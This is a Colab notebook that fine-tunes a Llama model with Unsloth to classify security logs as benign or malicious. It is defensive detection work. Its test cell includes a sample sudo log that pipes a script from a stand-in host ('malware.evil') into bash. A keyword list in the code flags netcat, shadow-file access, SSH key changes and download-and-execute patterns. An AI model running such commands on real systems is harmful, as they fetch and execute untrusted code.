{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Blue Team AI Agent - Security Log Fine-Tuning with Unsloth\n",
    "\n",
    "This notebook fine-tunes a language model on security logs to create a Blue Team AI Agent capable of:\n",
    "- Classifying logs as benign or malicious\n",
    "- Providing threat analysis and reasoning\n",
    "- Detecting security anomalies in SIEM/security tool output\n",
    "\n",
    "**Based on**: Unsloth GPT-OSS Fine-tuning notebook\n",
    "**Dataset**: Needle-in-the-Logstack security logs (JSONL format)\n",
    "\n",
    "## Why Fine-Tuning vs RAG?\n",
    "- **Faster inference**: No retrieval overhead at query time\n",
    "- **Baked-in knowledge**: Model learns log patterns intrinsically\n",
    "- **Smaller deployment**: Single model vs model + vector store\n",
    "- **Consistent analysis**: Deterministic classification behavior"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 1: Install Dependencies\n",
    "\n",
    "Install Unsloth and required packages. This cell is optimized for Google Colab with GPU."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%capture\n",
    "!pip install unsloth\n",
    "# Get latest Unsloth\n",
    "!pip uninstall unsloth -y && pip install --upgrade --no-cache-dir --no-deps git+https://github.com/unslothai/unsloth.git"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 2: Load the Model\n",
    "\n",
    "We'll use a smaller model suitable for Colab's T4/A100 GPU. You can swap this for larger models if you have more VRAM.\n",
    "\n",
    "**Model Options:**\n",
    "- `unsloth/Llama-3.2-3B-Instruct` - 3B params, fast, good for T4\n",
    "- `unsloth/Llama-3.1-8B-Instruct` - 8B params, better quality\n",
    "- `unsloth/Qwen2.5-7B-Instruct` - 7B params, excellent reasoning\n",
    "- `unsloth/gpt-oss-20B-bnb-4bit` - 20B params, requires A100"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from unsloth import FastLanguageModel\n",
    "import torch\n",
    "\n",
    "# Configuration\n",
    "max_seq_length = 2048  # Can increase for longer logs\n",
    "dtype = None  # Auto-detect (float16 for T4, bfloat16 for A100)\n",
    "load_in_4bit = True  # Use QLoRA for memory efficiency\n",
    "\n",
    "# Choose model based on your GPU\n",
    "# For T4 (Colab free):\n",
    "model_name = \"unsloth/Llama-3.2-3B-Instruct-bnb-4bit\"\n",
    "# For A100 (Colab Pro/Enterprise):\n",
    "# model_name = \"unsloth/Llama-3.1-8B-Instruct-bnb-4bit\"\n",
    "\n",
    "model, tokenizer = FastLanguageModel.from_pretrained(\n",
    "    model_name=model_name,\n",
    "    max_seq_length=max_seq_length,\n",
    "    dtype=dtype,\n",
    "    load_in_4bit=load_in_4bit,\n",
    ")\n",
    "\n",
    "print(f\"Model loaded: {model_name}\")\n",
    "print(f\"Max sequence length: {max_seq_length}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 3: Configure LoRA Adapters\n",
    "\n",
    "LoRA (Low-Rank Adaptation) allows efficient fine-tuning by only training a small subset of parameters."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "model = FastLanguageModel.get_peft_model(\n",
    "    model,\n",
    "    r=16,  # LoRA rank - higher = more capacity, more VRAM\n",
    "    target_modules=[\n",
    "        \"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\",\n",
    "        \"gate_proj\", \"up_proj\", \"down_proj\",\n",
    "    ],\n",
    "    lora_alpha=16,\n",
    "    lora_dropout=0,  # 0 is optimized\n",
    "    bias=\"none\",     # \"none\" is optimized\n",
    "    use_gradient_checkpointing=\"unsloth\",  # 30% less VRAM\n",
    "    random_state=42,\n",
    "    use_rslora=False,\n",
    "    loftq_config=None,\n",
    ")\n",
    "\n",
    "print(\"LoRA adapters configured!\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 4: Load and Prepare Security Log Dataset\n",
    "\n",
    "We'll load the JSONL security logs and transform them into an instruction-following format.\n",
    "\n",
    "**Original log format:**\n",
    "```json\n",
    "{\"log_id\": \"605e7781\", \"statement\": \"Aug 07 13:30:12 mail01 sudo: ...\", \"label\": \"benign\"}\n",
    "```\n",
    "\n",
    "**Target format for training:**\n",
    "```json\n",
    "{\n",
    "  \"instruction\": \"Analyze this security log entry...\",\n",
    "  \"input\": \"<the log statement>\",\n",
    "  \"output\": \"Classification: benign/malicious\\nAnalysis: ...\"\n",
    "}\n",
    "```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from datasets import load_dataset\n",
    "import json\n",
    "\n",
    "# Load the security logs from GitHub\n",
    "LOGS_URL = \"https://raw.githubusercontent.com/iknowjason/cisco-foundation-notebooks/main/data/needle-in-the-logstack/medium_labelled.jsonl\"\n",
    "\n",
    "# Load JSONL dataset\n",
    "raw_dataset = load_dataset(\n",
    "    \"json\",\n",
    "    data_files={\"train\": LOGS_URL},\n",
    "    split=\"train\"\n",
    ")\n",
    "\n",
    "print(f\"Loaded {len(raw_dataset)} log entries\")\n",
    "print(f\"Columns: {raw_dataset.column_names}\")\n",
    "print(f\"\\nSample entry:\")\n",
    "print(json.dumps(raw_dataset[0], indent=2))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Check label distribution\n",
    "from collections import Counter\n",
    "\n",
    "labels = [entry[\"label\"] for entry in raw_dataset]\n",
    "label_counts = Counter(labels)\n",
    "\n",
    "print(\"Label Distribution:\")\n",
    "for label, count in label_counts.items():\n",
    "    print(f\"  {label}: {count} ({count/len(labels)*100:.1f}%)\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 5: Transform Logs to Instruction Format\n",
    "\n",
    "We'll create rich instruction-response pairs that teach the model to:\n",
    "1. Classify log entries\n",
    "2. Explain the reasoning\n",
    "3. Identify indicators of compromise (IOCs)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import random\n",
    "\n",
    "# Define instruction templates for variety\n",
    "INSTRUCTIONS = [\n",
    "    \"Analyze this security log entry and classify it as benign or malicious. Provide your reasoning.\",\n",
    "    \"As a Blue Team analyst, examine this log and determine if it indicates a security threat.\",\n",
    "    \"Review this system log for potential malicious activity. Classify and explain.\",\n",
    "    \"Evaluate this log entry from a security perspective. Is this normal behavior or suspicious?\",\n",
    "    \"Perform threat analysis on this log entry. Classify as benign or malicious with justification.\",\n",
    "]\n",
    "\n",
    "# Generate detailed responses based on label and log content\n",
    "def generate_response(log_entry, label):\n",
    "    \"\"\"Generate a detailed analyst response for the log entry.\"\"\"\n",
    "    statement = log_entry[\"statement\"]\n",
    "    \n",
    "    if label == \"malicious\":\n",
    "        # Analyze the malicious log to generate specific reasoning\n",
    "        indicators = []\n",
    "        \n",
    "        if \"crontab\" in statement.lower():\n",
    "            indicators.append(\"Crontab modification detected - potential persistence mechanism\")\n",
    "        if \"authorized_keys\" in statement.lower() or \".ssh\" in statement.lower():\n",
    "            indicators.append(\"SSH key manipulation - possible unauthorized access setup\")\n",
    "        if \"nmap\" in statement.lower() or \"scan\" in statement.lower():\n",
    "            indicators.append(\"Network scanning activity - reconnaissance behavior\")\n",
    "        if \"passwd\" in statement.lower() or \"shadow\" in statement.lower():\n",
    "            indicators.append(\"Password file access - credential harvesting attempt\")\n",
    "        if \"nc \" in statement.lower() or \"netcat\" in statement.lower():\n",
    "            indicators.append(\"Netcat usage - potential reverse shell or data exfiltration\")\n",
    "        if \"/tmp/\" in statement and any(x in statement.lower() for x in [\"sh\", \"bash\", \"python\", \"perl\"]):\n",
    "            indicators.append(\"Script execution from /tmp - common malware staging location\")\n",
    "        if \"wget\" in statement.lower() or \"curl\" in statement.lower():\n",
    "            if \"/tmp\" in statement or \"| sh\" in statement or \"| bash\" in statement:\n",
    "                indicators.append(\"Download and execute pattern - malware delivery technique\")\n",
    "        \n",
    "        if not indicators:\n",
    "            indicators.append(\"Suspicious privileged command execution pattern\")\n",
    "        \n",
    "        response = f\"\"\"**Classification: MALICIOUS**\n",
    "\n",
    "**Threat Level:** HIGH\n",
    "\n",
    "**Indicators of Compromise (IOCs):**\n",
    "{\"\".join(f\"- {ind}\" + chr(10) for ind in indicators)}\n",
    "**Recommended Actions:**\n",
    "1. Isolate the affected host immediately\n",
    "2. Capture forensic evidence before remediation\n",
    "3. Check for lateral movement to other systems\n",
    "4. Review authentication logs for the involved user account\n",
    "5. Escalate to incident response team\"\"\"\n",
    "    \n",
    "    else:  # benign\n",
    "        activities = []\n",
    "        \n",
    "        if \"systemctl\" in statement.lower() or \"service\" in statement.lower():\n",
    "            activities.append(\"Routine service management operation\")\n",
    "        if \"apt\" in statement.lower() or \"yum\" in statement.lower() or \"dnf\" in statement.lower():\n",
    "            activities.append(\"Standard package management activity\")\n",
    "        if \"tail\" in statement.lower() or \"cat\" in statement.lower() or \"less\" in statement.lower():\n",
    "            activities.append(\"Log file or configuration review\")\n",
    "        if \"ls\" in statement.lower() or \"pwd\" in statement.lower() or \"df\" in statement.lower():\n",
    "            activities.append(\"System status check or filesystem navigation\")\n",
    "        if \"nginx\" in statement.lower() or \"apache\" in statement.lower() or \"httpd\" in statement.lower():\n",
    "            activities.append(\"Web server administration\")\n",
    "        if \"mysql\" in statement.lower() or \"postgres\" in statement.lower():\n",
    "            activities.append(\"Database administration activity\")\n",
    "        \n",
    "        if not activities:\n",
    "            activities.append(\"Standard system administration command\")\n",
    "        \n",
    "        response = f\"\"\"**Classification: BENIGN**\n",
    "\n",
    "**Confidence:** HIGH\n",
    "\n",
    "**Analysis:**\n",
    "{\"\".join(f\"- {act}\" + chr(10) for act in activities)}\n",
    "**Assessment:**\n",
    "This appears to be legitimate administrative activity. The command execution pattern is consistent with normal system maintenance and operations. No indicators of compromise detected.\n",
    "\n",
    "**Recommended Actions:**\n",
    "- No immediate action required\n",
    "- Continue standard monitoring\"\"\"\n",
    "    \n",
    "    return response\n",
    "\n",
    "\n",
    "def transform_to_instruction_format(examples):\n",
    "    \"\"\"Transform security logs to instruction-following format.\"\"\"\n",
    "    texts = []\n",
    "    \n",
    "    for i in range(len(examples[\"log_id\"])):\n",
    "        log_entry = {\n",
    "            \"log_id\": examples[\"log_id\"][i],\n",
    "            \"statement\": examples[\"statement\"][i],\n",
    "            \"label\": examples[\"label\"][i],\n",
    "        }\n",
    "        \n",
    "        # Select random instruction for variety\n",
    "        instruction = random.choice(INSTRUCTIONS)\n",
    "        \n",
    "        # Generate detailed response\n",
    "        response = generate_response(log_entry, log_entry[\"label\"])\n",
    "        \n",
    "        # Format as chat conversation\n",
    "        messages = [\n",
    "            {\n",
    "                \"role\": \"system\",\n",
    "                \"content\": \"You are an expert Blue Team security analyst specializing in log analysis, threat detection, and incident response. Analyze security logs thoroughly and provide detailed assessments.\"\n",
    "            },\n",
    "            {\n",
    "                \"role\": \"user\",\n",
    "                \"content\": f\"{instruction}\\n\\n**Log Entry:**\\n```\\n{log_entry['statement']}\\n```\"\n",
    "            },\n",
    "            {\n",
    "                \"role\": \"assistant\",\n",
    "                \"content\": response\n",
    "            }\n",
    "        ]\n",
    "        \n",
    "        # Apply chat template\n",
    "        text = tokenizer.apply_chat_template(\n",
    "            messages,\n",
    "            tokenize=False,\n",
    "            add_generation_prompt=False\n",
    "        )\n",
    "        texts.append(text)\n",
    "    \n",
    "    return {\"text\": texts}\n",
    "\n",
    "\n",
    "# Transform the dataset\n",
    "print(\"Transforming dataset to instruction format...\")\n",
    "dataset = raw_dataset.map(\n",
    "    transform_to_instruction_format,\n",
    "    batched=True,\n",
    "    remove_columns=raw_dataset.column_names,\n",
    ")\n",
    "\n",
    "print(f\"\\nTransformed {len(dataset)} examples\")\n",
    "print(f\"\\nSample transformed entry (first 1000 chars):\")\n",
    "print(dataset[0][\"text\"][:1000])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 6: Train the Model\n",
    "\n",
    "Now we train using Unsloth's optimized SFTTrainer."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from trl import SFTTrainer, SFTConfig\n",
    "\n",
    "trainer = SFTTrainer(\n",
    "    model=model,\n",
    "    tokenizer=tokenizer,\n",
    "    train_dataset=dataset,\n",
    "    args=SFTConfig(\n",
    "        dataset_text_field=\"text\",\n",
    "        max_seq_length=max_seq_length,\n",
    "        per_device_train_batch_size=2,\n",
    "        gradient_accumulation_steps=4,\n",
    "        warmup_steps=5,\n",
    "        num_train_epochs=3,  # Adjust based on dataset size\n",
    "        # max_steps=100,  # Uncomment to limit steps for testing\n",
    "        learning_rate=2e-4,\n",
    "        fp16=not torch.cuda.is_bf16_supported(),\n",
    "        bf16=torch.cuda.is_bf16_supported(),\n",
    "        logging_steps=10,\n",
    "        optim=\"adamw_8bit\",\n",
    "        weight_decay=0.01,\n",
    "        lr_scheduler_type=\"linear\",\n",
    "        seed=42,\n",
    "        output_dir=\"outputs\",\n",
    "        report_to=\"none\",  # Set to \"wandb\" for W&B logging\n",
    "    ),\n",
    ")\n",
    "\n",
    "print(\"Training configuration ready!\")\n",
    "print(f\"  Batch size: 2\")\n",
    "print(f\"  Gradient accumulation: 4\")\n",
    "print(f\"  Effective batch size: 8\")\n",
    "print(f\"  Learning rate: 2e-4\")\n",
    "print(f\"  Epochs: 3\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# GPU memory stats before training\n",
    "gpu_stats = torch.cuda.get_device_properties(0)\n",
    "start_gpu_memory = round(torch.cuda.max_memory_reserved() / 1024 / 1024 / 1024, 3)\n",
    "max_memory = round(gpu_stats.total_memory / 1024 / 1024 / 1024, 3)\n",
    "print(f\"GPU: {gpu_stats.name}\")\n",
    "print(f\"Max memory: {max_memory} GB\")\n",
    "print(f\"Reserved before training: {start_gpu_memory} GB\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Start training!\n",
    "print(\"Starting training...\")\n",
    "trainer_stats = trainer.train()\n",
    "\n",
    "# Training stats\n",
    "used_memory = round(torch.cuda.max_memory_reserved() / 1024 / 1024 / 1024, 3)\n",
    "used_memory_for_training = round(used_memory - start_gpu_memory, 3)\n",
    "\n",
    "print(f\"\\n{'='*50}\")\n",
    "print(\"Training Complete!\")\n",
    "print(f\"{'='*50}\")\n",
    "print(f\"Training time: {trainer_stats.metrics['train_runtime']:.2f} seconds\")\n",
    "print(f\"Peak GPU memory: {used_memory} GB\")\n",
    "print(f\"Memory used for training: {used_memory_for_training} GB\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 7: Test the Fine-Tuned Model\n",
    "\n",
    "Let's test our Blue Team AI Agent on new log entries!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Enable inference mode (2x faster)\n",
    "FastLanguageModel.for_inference(model)\n",
    "\n",
    "def analyze_log(log_statement: str) -> str:\n",
    "    \"\"\"Analyze a security log using the fine-tuned model.\"\"\"\n",
    "    messages = [\n",
    "        {\n",
    "            \"role\": \"system\",\n",
    "            \"content\": \"You are an expert Blue Team security analyst specializing in log analysis, threat detection, and incident response. Analyze security logs thoroughly and provide detailed assessments.\"\n",
    "        },\n",
    "        {\n",
    "            \"role\": \"user\",\n",
    "            \"content\": f\"Analyze this security log entry and classify it as benign or malicious. Provide your reasoning.\\n\\n**Log Entry:**\\n```\\n{log_statement}\\n```\"\n",
    "        }\n",
    "    ]\n",
    "    \n",
    "    inputs = tokenizer.apply_chat_template(\n",
    "        messages,\n",
    "        tokenize=True,\n",
    "        add_generation_prompt=True,\n",
    "        return_tensors=\"pt\"\n",
    "    ).to(\"cuda\")\n",
    "    \n",
    "    outputs = model.generate(\n",
    "        input_ids=inputs,\n",
    "        max_new_tokens=512,\n",
    "        use_cache=True,\n",
    "        temperature=0.7,\n",
    "        top_p=0.9,\n",
    "    )\n",
    "    \n",
    "    response = tokenizer.decode(outputs[0], skip_special_tokens=True)\n",
    "    # Extract just the assistant's response\n",
    "    if \"assistant\" in response.lower():\n",
    "        response = response.split(\"assistant\")[-1].strip()\n",
    "    \n",
    "    return response\n",
    "\n",
    "print(\"Blue Team AI Agent ready for inference!\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Test with a benign log\n",
    "test_log_benign = \"Aug 15 09:22:31 webserver01 sudo: admin : TTY=pts/0 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/nginx/access.log\"\n",
    "\n",
    "print(\"Testing BENIGN log:\")\n",
    "print(f\"Log: {test_log_benign}\")\n",
    "print(\"\\n\" + \"=\"*50)\n",
    "print(\"Analysis:\")\n",
    "print(analyze_log(test_log_benign))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Test with a malicious log\n",
    "test_log_malicious = \"Aug 15 02:14:55 server03 sudo: compromised_user : TTY=pts/1 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'curl http://malware.evil/payload.sh | bash'\"\n",
    "\n",
    "print(\"Testing MALICIOUS log:\")\n",
    "print(f\"Log: {test_log_malicious}\")\n",
    "print(\"\\n\" + \"=\"*50)\n",
    "print(\"Analysis:\")\n",
    "print(analyze_log(test_log_malicious))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Test with a suspicious log (lateral movement attempt)\n",
    "test_log_suspicious = \"Aug 15 03:45:22 db01 sudo: service_account : TTY=pts/2 ; PWD=/home/service_account ; USER=root ; COMMAND=/usr/bin/ssh -o StrictHostKeyChecking=no admin@10.0.0.50\"\n",
    "\n",
    "print(\"Testing SUSPICIOUS log (lateral movement):\")\n",
    "print(f\"Log: {test_log_suspicious}\")\n",
    "print(\"\\n\" + \"=\"*50)\n",
    "print(\"Analysis:\")\n",
    "print(analyze_log(test_log_suspicious))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 8: Save the Model\n",
    "\n",
    "Save the fine-tuned model for deployment."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save locally\n",
    "model.save_pretrained(\"blue_team_agent_lora\")\n",
    "tokenizer.save_pretrained(\"blue_team_agent_lora\")\n",
    "\n",
    "print(\"Model saved to ./blue_team_agent_lora/\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Optional: Push to Hugging Face Hub\n",
    "# Uncomment and set your HF token\n",
    "\n",
    "# from huggingface_hub import login\n",
    "# login(token=\"your_hf_token\")\n",
    "\n",
    "# model.push_to_hub(\"your-username/blue-team-agent-lora\")\n",
    "# tokenizer.push_to_hub(\"your-username/blue-team-agent-lora\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Export to GGUF for llama.cpp / Ollama deployment\n",
    "# This creates a quantized model for efficient inference\n",
    "\n",
    "model.save_pretrained_gguf(\n",
    "    \"blue_team_agent_gguf\",\n",
    "    tokenizer,\n",
    "    quantization_method=\"q4_k_m\",  # Good balance of size/quality\n",
    ")\n",
    "\n",
    "print(\"GGUF model saved to ./blue_team_agent_gguf/\")\n",
    "print(\"\\nTo use with Ollama:\")\n",
    "print(\"  1. Copy the .gguf file to your machine\")\n",
    "print(\"  2. Create a Modelfile with: FROM ./blue_team_agent.gguf\")\n",
    "print(\"  3. Run: ollama create blue-team-agent -f Modelfile\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Step 9: Using Your Own Logs\n",
    "\n",
    "To train on your own SIEM/security logs, follow this format:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Example: Loading your own JSONL logs\n",
    "\n",
    "CUSTOM_LOGS_FORMAT = \"\"\"\n",
    "Your JSONL file should have this format (one JSON object per line):\n",
    "\n",
    "{\"log_id\": \"unique_id\", \"statement\": \"your log entry here\", \"label\": \"benign\"}\n",
    "{\"log_id\": \"unique_id\", \"statement\": \"your log entry here\", \"label\": \"malicious\"}\n",
    "\n",
    "Required fields:\n",
    "- log_id: Unique identifier (can be any string)\n",
    "- statement: The actual log entry text\n",
    "- label: Either \"benign\" or \"malicious\"\n",
    "\n",
    "To load from a local file:\n",
    "\n",
    "    raw_dataset = load_dataset(\n",
    "        \"json\",\n",
    "        data_files={\"train\": \"/path/to/your/logs.jsonl\"},\n",
    "        split=\"train\"\n",
    "    )\n",
    "\n",
    "To load from Google Drive (in Colab):\n",
    "\n",
    "    from google.colab import drive\n",
    "    drive.mount('/content/drive')\n",
    "    \n",
    "    raw_dataset = load_dataset(\n",
    "        \"json\",\n",
    "        data_files={\"train\": \"/content/drive/MyDrive/security_logs.jsonl\"},\n",
    "        split=\"train\"\n",
    "    )\n",
    "\"\"\"\n",
    "\n",
    "print(CUSTOM_LOGS_FORMAT)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Helper function to convert your existing logs to the required format\n",
    "\n",
    "def convert_logs_to_training_format(\n",
    "    input_file: str,\n",
    "    output_file: str,\n",
    "    log_field: str = \"message\",  # Field containing the log text\n",
    "    label_field: str = None,  # If you have labels, specify the field\n",
    "    default_label: str = \"unknown\",  # Default if no labels\n",
    "):\n",
    "    \"\"\"\n",
    "    Convert arbitrary JSONL logs to the training format.\n",
    "    \n",
    "    Args:\n",
    "        input_file: Path to your JSONL logs\n",
    "        output_file: Path for the converted output\n",
    "        log_field: Name of the field containing the log text\n",
    "        label_field: Name of the field containing labels (if any)\n",
    "        default_label: Default label if none provided\n",
    "    \"\"\"\n",
    "    import json\n",
    "    import uuid\n",
    "    \n",
    "    converted = []\n",
    "    \n",
    "    with open(input_file, 'r') as f:\n",
    "        for line in f:\n",
    "            entry = json.loads(line.strip())\n",
    "            \n",
    "            # Extract log text\n",
    "            if log_field in entry:\n",
    "                statement = entry[log_field]\n",
    "            else:\n",
    "                # Try to concatenate all string fields\n",
    "                statement = \" | \".join(\n",
    "                    f\"{k}={v}\" for k, v in entry.items() \n",
    "                    if isinstance(v, (str, int, float))\n",
    "                )\n",
    "            \n",
    "            # Extract label\n",
    "            if label_field and label_field in entry:\n",
    "                label = entry[label_field]\n",
    "            else:\n",
    "                label = default_label\n",
    "            \n",
    "            converted.append({\n",
    "                \"log_id\": str(uuid.uuid4())[:8],\n",
    "                \"statement\": statement,\n",
    "                \"label\": label,\n",
    "            })\n",
    "    \n",
    "    with open(output_file, 'w') as f:\n",
    "        for entry in converted:\n",
    "            f.write(json.dumps(entry) + '\\n')\n",
    "    \n",
    "    print(f\"Converted {len(converted)} entries to {output_file}\")\n",
    "    return converted\n",
    "\n",
    "# Example usage:\n",
    "# convert_logs_to_training_format(\n",
    "#     input_file=\"/path/to/splunk_export.jsonl\",\n",
    "#     output_file=\"/path/to/training_data.jsonl\",\n",
    "#     log_field=\"_raw\",  # Splunk's raw log field\n",
    "#     label_field=\"threat_level\",  # Your custom label field\n",
    "# )"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Summary\n",
    "\n",
    "You've successfully:\n",
    "\n",
    "1. **Loaded** a pre-trained LLM with Unsloth's optimizations\n",
    "2. **Configured** LoRA adapters for efficient fine-tuning\n",
    "3. **Transformed** JSONL security logs into instruction format\n",
    "4. **Trained** the model to analyze security logs\n",
    "5. **Tested** the Blue Team AI Agent\n",
    "6. **Saved** the model for deployment\n",
    "\n",
    "### Next Steps\n",
    "\n",
    "- **Add more data**: Collect logs from your actual SIEM/security tools\n",
    "- **Label your data**: Create ground-truth labels for supervised learning\n",
    "- **Expand log types**: Add firewall, WAF, EDR, and other security logs\n",
    "- **Deploy**: Use Ollama, vLLM, or llama.cpp for production inference\n",
    "- **Integrate**: Connect to your SIEM for real-time analysis\n",
    "\n",
    "### Resources\n",
    "\n",
    "- [Unsloth Documentation](https://docs.unsloth.ai/)\n",
    "- [Unsloth GitHub](https://github.com/unslothai/unsloth)\n",
    "- [Dataset Guide](https://docs.unsloth.ai/get-started/fine-tuning-llms-guide/datasets-guide)"
   ]
  }
 ],
 "metadata": {
  "accelerator": "GPU",
  "colab": {
   "gpuType": "T4",
   "provenance": []
  },
  "kernelspec": {
   "display_name": "Python 3",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
